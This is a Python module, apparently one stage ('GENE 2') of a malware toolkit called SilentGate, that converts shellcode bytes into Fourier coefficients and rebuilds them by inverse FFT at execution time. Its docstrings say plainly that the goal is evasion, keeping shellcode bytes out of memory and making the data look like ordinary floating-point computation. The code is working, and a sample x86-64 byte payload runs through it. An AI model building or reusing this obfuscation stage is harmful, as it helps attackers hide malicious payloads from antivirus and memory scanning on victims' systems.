"""
SilentGate - GENE 2: DFT Encoder
INPUT  : numpy uint8 array + metadata (from GENE 1)
OUTPUT : complex coefficient array + updated metadata
CONTRACT: output feeds directly into GENE 3 tensor_splitter.py

Mathematical foundation:
  DFT: F[k] = sum(P[n] * e^(-i2*pi*k*n/N)) for k=0..N-1
  IDFT: P[n] = (1/N) * sum(F[k] * e^(i2*pi*k*n/N)) for n=0..N-1

Why this works for evasion:
  Payload bytes P[n] transformed to frequency coefficients F[k]
  F[k] are complex floating point numbers
  No shellcode bytes exist in memory — only complex numbers
  Payload reconstructed via IDFT at execution time only
"""

import numpy as np
import json
import os
import hashlib


def pad_to_power_of_two(arr):
    """
    Pad array to next power of 2 for efficient FFT computation.
    Padding with zeros does not affect reconstruction.
    Returns padded array and original length.
    """
    N = len(arr)
    next_pow2 = 1
    while next_pow2 < N:
        next_pow2 <<= 1
    if next_pow2 > N:
        arr = np.pad(arr, (0, next_pow2 - N), mode='constant')
    return arr, N


def encode(payload_array, metadata):
    """
    Apply Discrete Fourier Transform to payload array.
    
    The DFT maps payload bytes from time/spatial domain
    to frequency domain. The result is an array of complex
    numbers with no resemblance to the original bytes.
    
    Entropy analysis:
      Original bytes: structured, potentially low entropy
      DFT coefficients: distributed across complex plane
      Statistical profile: resembles floating point computation data
    
    Returns:
      coefficients : np.ndarray of complex128
      updated_meta : dict with DFT parameters for reconstruction
    """
    # Pad to power of 2 for FFT efficiency
    padded, original_length = pad_to_power_of_two(payload_array.astype(np.float64))

    # Apply DFT using numpy FFT (Fast Fourier Transform)
    # numpy FFT is numerically stable and exact for reconstruction
    coefficients = np.fft.fft(padded)

    # Compute entropy of magnitude spectrum
    magnitudes  = np.abs(coefficients)
    mag_sum     = magnitudes.sum()
    if mag_sum > 0:
        probs   = magnitudes / mag_sum
        probs   = probs[probs > 0]
        entropy = -np.sum(probs * np.log2(probs))
    else:
        entropy = 0.0

    updated_meta = {
        **metadata,
        "gene":              2,
        "output_contract":   "complex128 array -> GENE3 tensor_splitter",
        "original_length":   original_length,
        "padded_length":     len(padded),
        "coeff_count":       len(coefficients),
        "coeff_dtype":       str(coefficients.dtype),
        "magnitude_entropy": float(entropy),
        "coeff_sha256":      hashlib.sha256(
                                 coefficients.tobytes()
                             ).hexdigest(),
        "dc_component":      float(np.abs(coefficients[0])),
        "max_magnitude":     float(magnitudes.max()),
        "mean_magnitude":    float(magnitudes.mean()),
    }

    return coefficients, updated_meta


def decode(coefficients, original_length):
    """
    Apply Inverse DFT to reconstruct original payload bytes.
    This runs at execution time only — payload never stored as bytes.
    
    Reconstruction is exact up to floating point rounding.
    We round and clip to uint8 range [0, 255].
    """
    reconstructed = np.fft.ifft(coefficients)
    reconstructed = np.real(reconstructed)
    reconstructed = np.round(reconstructed).astype(np.int32)
    reconstructed = np.clip(reconstructed, 0, 255).astype(np.uint8)
    return reconstructed[:original_length]


def validate_reconstruction(original, coefficients, original_length):
    """
    Verify IDFT(DFT(P)) == P
    This is the mathematical guarantee of our approach.
    """
    recovered = decode(coefficients, original_length)
    return np.array_equal(original, recovered)


def save_coefficients(coefficients, path="output/gene2_coefficients.npy"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    np.save(path, coefficients)


def save_metadata(metadata, path="output/gene2_metadata.json"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(metadata, f, indent=2)


if __name__ == "__main__":
    from gene1_payload_ingester import ingest, validate_output

    test_payload = bytes([
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20,
        0x48, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0x48, 0x83,
        0xC4, 0x28, 0xC3
    ])

    # GENE 1 output
    arr, meta1 = ingest(test_payload, source_type="bytes")

    # GENE 2 processing
    coeffs, meta2 = encode(arr, meta1)

    # Verify mathematical correctness
    valid = validate_reconstruction(arr, coeffs, meta2["original_length"])

    save_coefficients(coeffs)
    save_metadata(meta2)

    print(f"[GENE 2] INPUT  : uint8 array shape={arr.shape}")
    print(f"[GENE 2] OUTPUT : complex128 array shape={coeffs.shape}")
    print(f"[GENE 2] SAMPLE : F[0]={coeffs[0]:.4f} F[1]={coeffs[1]:.4f}")
    print(f"[GENE 2] ENTROPY: {meta2['magnitude_entropy']:.4f} bits")
    print(f"[GENE 2] VERIFY : IDFT(DFT(P)) == P -> {valid}")
    print(f"[GENE 2] READY  : output contracts validated -> GENE 3")
